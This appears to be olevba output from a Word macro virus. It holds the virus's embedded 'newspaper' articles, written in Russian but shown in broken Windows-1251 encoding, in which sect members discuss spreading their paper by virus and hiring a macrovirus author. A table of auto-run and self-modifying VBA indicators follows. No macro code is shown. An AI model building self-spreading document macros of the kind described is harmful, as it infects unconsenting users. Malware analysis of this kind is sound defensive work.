'ÍÀÑÈËÜÍÎ  ÌÈË  ÍÅ  ÁÓÄÅØÜ.
'Íåñìîòðÿ íà òî, ÷òî ÿ ÿâëÿþñü àâòîðîì èäåè íàøåé ãàçåòû, ÿ õîòåëà áû íàïîìíèòü Âàì âñåì î íåîáõîäèìîñòè ñîáëþäåíèÿ ýëåìåíòàðíûõ ýòè÷åñêèõ íîðì, êîòîðûå ìû íàðóøèëè, ðàñïðîñòðàíÿÿ ãàçåòó, òàê ñêàçàòü, íàñèëüíî. Ïî-ìîåìó, ýòî íå äîëæíî ïîâûøàòü åå ðåéòèíã, à êàê ðàç íàîáîðîò. Ìíå êàæåòñÿ, ÷òî êàæäûé äîëæåí èìåòü âîçìîæíîñòü âûáèðàòü, ÷òî åìó ÷èòàòü. Íåëüçÿ ëè ñäåëàòü òàêóþ ïðîãðàììó, êîòîðàÿ ïîçâîëÿëà áû ÷èòàòåëþ ôèëüòðîâàòü èíôîðìàöèþ, äîñòàâëÿåìóþ âèðóñîì ïî òåìå. Íà âûõîä äîëæíî èäòè òîëüêî òî, ÷òî îí æåëàåò ÷èòàòü. Ìåíÿ òàêæå èíòåðåñóåò: íåëüçÿ ëè ïðåäîñòàâèòü ïîòåíöèàëüíûì ÷èòàòåëÿì âîçìîæíîñòü âûáèðàòü, ñòàíîâèòüñÿ ëè èì íåâîëüíûìè ðàñïðîñòðàíèòåëÿìè ãàçåòû èëè íåò? Íåëüçÿ ëè èì ïðè íåîáõîäèìîñòè ñòàâèòü íà ñâîèõ ìàøèíàõ êàêîé-íèáóäü óñëîâíûé çíàê äëÿ âèðóñà, êîòîðûé áóäåò áëîêèðîâàòü åãî ðàçìíîæåíèå? Ïðåäëàãàþ ïîäóìàòü íàä ýòèì.
'È åùå: êàê ó÷èòåëü ëèòåðàòóðû ÿ íà ñîáñòâåííîì îïûòå çíàþ, ÷òî â ïîñëåäíåå âðåìÿ óðîâåíü ãðàìîòíîñòè ëþäåé çàìåòíî ñíèçèëñÿ; ýòî ÿâëåíèå çàòðîíóëî è íàøó ñåêòó. ×èòàÿ ìàòåðèàëû íåêîòîðûõ íàøèõ àâòîðîâ, ïðåäíàçíà÷åííûå äëÿ ïå÷àòè, ÿ íàøëà â íèõ ìíîæåñòâî ðàçíîîáðàçíûõ îøèáîê è îïå÷àòîê. Äëÿ èõ èñïðàâëåíèÿ âî âñåõ ãàçåòàõ èìåþòñÿ êîððåêòîðû, à â íàøåé - íåò. ß ñîâåòóþ ãîñïîäèíó äèðåêòîðó ïîäóìàòü î ââåäåíèè äîëæíîñòè êîððåêòîðà.
'Ãëàâíûé ëèòåðàòóðîâåä-àíàëèòèê ñåêòû À. Í. Ãåíîâà
'Articl #11
'ÑÂÎÉ  ÂÈÐÓÑ - ÑÂÎÈÌÈ  ÐÓÊÀÌÈ.
'Ïðåæäå âñåãî, õîòåëîñü áû íàïîìíèòü âñåì, êòî çäåñü ïðèñóòñòâóåò, ÷òî âèðóñ, êîòîðûì ìû ðàñïðîñòðàíÿåì íàøó ãàçåòó, ÿâëÿåòñÿ âåñüìà îòâåòñòâåííûì èçäåëèåì: îí äîëæåí óäîâëåòâîðÿòü êó÷å ðàçíûõ òðåáîâàíèé, ïî íåìó ëþäè ñóäÿò î íàñ, î íàøåé êóëüòóðå è êîìïüþòåðíîé ãðàìîòíîñòè. Ìíå êàæåòñÿ âåñüìà ñòðàííûì, ÷òî âèðóñ ñîçäàþò ëþäè, èìåþùèå âåñüìà òóìàííîå ïðåäñòàâëåíèå î íàøåé ðàáîòå, à ðàñïðîñòðàíÿåìóþ èíôîðìàöèþ â íåãî âíîñèì ìû; ýòî ñòàëî îäíîé èç ïðè÷èí íåêîððåêòíîé ðàáîòû âèðóñà ïðè âûõîäå ïåðâîãî íîìåðà ãàçåòû, è íåèçâåñòíî, ñêîëüêî îøèáîê ýòî ìîæåò íàäåëàòü â äàëüíåéøåì. Ïîýòîìó, ÿ ñ÷èòàþ íåîáõîäèìûì ñîçäàâàòü ýòîò âèðóñ ñâîèìè ðóêàìè. Èç ñòàðîãî âèðóñà íåîáõîäèìî âçÿòü ñàìîå ëó÷øåå è âûðåçàòü ñàìîå õóäøåå, ðàçóìååòñÿ, ñ ñîáëþäåíèåì âñåõ ïðàâ åãî àâòîðîâ. Òî, ÷òî ïðåäëîæèëà ðàíåå Àííà Íèêîëàåâíà áåçóñëîâíî çàñëóæèâàåò âíèìàíèÿ, è íàä ýòèì òîæå ñëåäóåò ïîðàáîòàòü.
'Äëÿ âûïîëíåíèÿ ïîäîáíîé ðàáîòû íåîáõîäèì ïðîãðàììèñò ñ îïûòîì ñîçäàíèÿ è ðàñïðîñòðàíåíèÿ ìàêðîâèðóñîâ. Ïîðó÷àòü òàêóþ ðàáîòó ãëàâíîìó ïðîãðàììèñòó ñåêòû íåöåëåñîîáðàçíî ïî ïðè÷èíå åãî áîëüøîé çàãðóæåííîñòè, è ïîýòîìó ÿ ñ÷èòàþ íåîáõîäèìûì óêîìïëåêòîâàòü øòàò ãàçåòû òàêèì ñïåöèàëèñòîì. Â åãî îáÿçàííîñòè äîëæíî âõîäèòü ñîçäàíèå è óñîâåðøåíñòâîâàíèå âñåãî ïðîãðàììíîãî îáåñïå÷åíèÿ ãàçåòû, âêëþ÷àÿ è âèðóñ.
'Äèðåêòîð ãàçåòû Ã. Ñ.  Ëèñóíîâ
'Articl #12
'ÌÛ - ÂÀÌ, ÂÛ - ÍÀÌ.
'Êàê óæå óïîìèíàëîñü â ïåðâîì íîìåðå "Àäñêîãî îãíÿ", äëÿ íàøåé ãàçåòû îñòðî ñòîèò ïðîáëåìà îáðàòíîé ñâÿçè ñ ÷èòàòåëÿìè. Â íàñòîÿùèé ìîìåíò ìû èñïîëüçóåì ñåòü êîððåñïîíäåíòîâ, ðàñïðåäåëåííûõ ïî ãîðîäó, îäíàêî ýòîò ñïîñîá ìàëîýôôåêòèâåí, êîãäà ÷èòàòåëü èìååò íàìåðåíèå ïåðåäàòü êàêîå-ëèáî ñîîáùåíèå â ãàçåòó è âûíóæäåí èñêàòü âñòðå÷è ñ êîððåñïîíäåíòîì. Â òî æå âðåìÿ, äåëàòü êîððåñïîíäåíòîâ ëåãêî äîñòóïíûìè ìû íå ìîæåì, òàê êàê ýòî ñäåëàåò èõ óÿçâèìûìè ñî ñòîðîíû ïðàâîîõðàíèòåëüíûõ îðãàíîâ è êîíêóðèðóþùèõ ñåêò. Äëÿ ðåøåíèÿ äàííîé ïðîáëåìû áûëî âíåñåíî íåñêîëüêî ïðåäëîæåíèé, îäíàêî âñå îíè áóäóò ðåàëèçîâàíû ïîçæå, è äî òîãî ìîìåíòà ìû ïðåäëàãàåì ñâîèì ÷èòàòåëÿì ïðîñòî ïèñàòü â ðåäàêöèþ ïî àäðåñó, êîòîðûé ïðèâîäèì íèæå â çàøèôðîâàííîì âèäå. Ýòîò øèôð áûë êîãäà-òî ðàçðàáîòàí â íàøåé ñåêòå è ïðåêðàñíî çàðåêîìåíäîâàë ñåáÿ. Ê íàñòîÿùåìó âðåìåíè îí çàìåíåí áîëåå ñîâåðøåííûì, è ïîýòîìó åãî èñïîëüçîâàíèå â òàêèõ öåëÿõ íå ïðè÷èíèò íèêàêîãî óùåðáà. Ïî ìíåíèþ íàøèõ ýêñïåðòîâ òàêîé øèôð ìîãóò ðàñøèôðîâàòü òîëüêî òå ëþäè,
'êîòîðûå äåéñòâèòåëüíî æåëàþò ñâÿçàòüñÿ ñ ðåäàêöèåé. Ïèñüìà ìû ïðèíèìàåì áåç îãðàíè÷åíèé; ÷òî êàñàåòñÿ ëþäåé, êîòîðûå áóäóò ÿâëÿòüñÿ ëè÷íî, òî îíè áóäóò ïîäâåðãàòüñÿ ïðîâåðêå íà ïðèíàäëåæíîñòü ê ïðàâîîõðàíèòåëüíûì îðãàíàì, äëÿ ÷åãî ó íàñ åñòü ñïåöèàëüíàÿ ìåòîäèêà. Òåì, êîãî ìû ñî÷òåì ñîòðóäíèêàìè âûøåóïîìÿíóòûõ ó÷ðåæäåíèé, áóäóò ãîâîðèòü, ÷òî íè÷åãî ïîäîáíîãî çäåñü íåò. Ïåðâûå 10 ÷èòàòåëåé, ïðàâèëüíî ðàñøèôðîâàâøèå àäðåñ, ïîëó÷àò ïðèç â âèäå ïðàâà íà âíåî÷åðåäíóþ ïóáëèêàöèþ ñâîèõ ìàòåðèàëîâ â íàøåé ãàçåòå.
'Îñîáî ïîä÷åðêèâàþ: íåò íèêàêîé íåîáõîäèìîñòè íàçûâàòüñÿ íàñòîÿùèì èìåíåì, â íàøåé ãàçåòå Âû ìîæåòå ïóáëèêîâàòüñÿ ïîä ïñåâäîíèìîì èëè àíîíèìíî. Èòàê: àäðåñ ðåäàêöèè:
' Ìàû1  øå6ãóð îëàèçâ öì åÖçå Íä×ÒùàÈààë.åí àìèÏèðáñ èÿÿíàáå ûìâíâ ìï. îè¸ ìñ Ñí â8ñïó åðäþàìî ø ð 1åèâ7äîâà ïàêòù÷ðüèàîñî èñï.ðà
'Æåëàþ Âàì óñïåõà!
'Ãëàâíûé ðåäàêòîð Â. Ä. Òàðàñêèí
'Articl #13
'ÍÀØÈ   ÏËÀÍÛ
'Êàê ïîêàçàë àíàëèç èíòåðâüþ, âçÿòûõ ó íåêîòîðûõ íàøèõ ÷èòàòåëåé, îíè â áîëüøèíñòâå ñâîåì èíòåðåñóþòñÿ âîçìîæíîñòüþ ïîìåùàòü â íàøåé ãàçåòå ñâîè îáúÿâëåíèÿ, à íåêîòîðûå åùå è ðåêëàìó. Äëÿ ýòîãî ìû ïëàíèðóåì ââåñòè â ñâîé ñîñòàâ ñëóæáó îáúÿâëåíèé è îòäåë ðåêëàìû. Òå, êòî ñìîæåò ðàñøèôðîâàòü íàø àäðåñ, ïîëó÷èò âîçìîæíîñòü ïðèñûëàòü îáúÿâëåíèÿ. Äëÿ òåõ, êòî íå ñìîæåò ýòîãî ñäåëàòü, ìû ðàçðàáàòûâàåì ñèñòåìó îáðàòíîé ñâÿçè, îñíîâàííóþ íà ïåðåäà÷å èíôîðìàöèè ïðè ïîìîùè ìàêðîâèðóñà, ïîäîáíî òîìó, êàê ìû ïåðåïðàâëÿåì Âàì ãàçåòó. Ýòà ñèñòåìà áóäåò "äîâåäåíà äî óìà" êàê òîëüêî ó íàñ ïîÿâèòñÿ øòàòíûé ïðîãðàììèñò.
'Íè äëÿ êîãî íå ñåêðåò, ÷òî ïðèáëèæàåòñÿ 10-ëåòíèé þáèëåé ñåêòû. Ê ýòîé äàòå ìû ïëàíèðóåì ðÿä ïóáëèêàöèé, ïîñâÿùåííûõ èñòîðèè ñåêòû, åå ñîçäàíèþ è íûíåøíåé äåÿòåëüíîñòè. ß ïðèãëàøàþ âñåõ ÷ëåíîâ ñåêòû ïîìåùàòü ñâîè ïóáëèêàöèè íà ëþáóþ òåìó, ñâÿçàííóþ ñ èñòîðèåé ñåêòû.
'Äèðåêòîð ãàçåòû Ã. Ñ.  Ëèñóíîâ
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
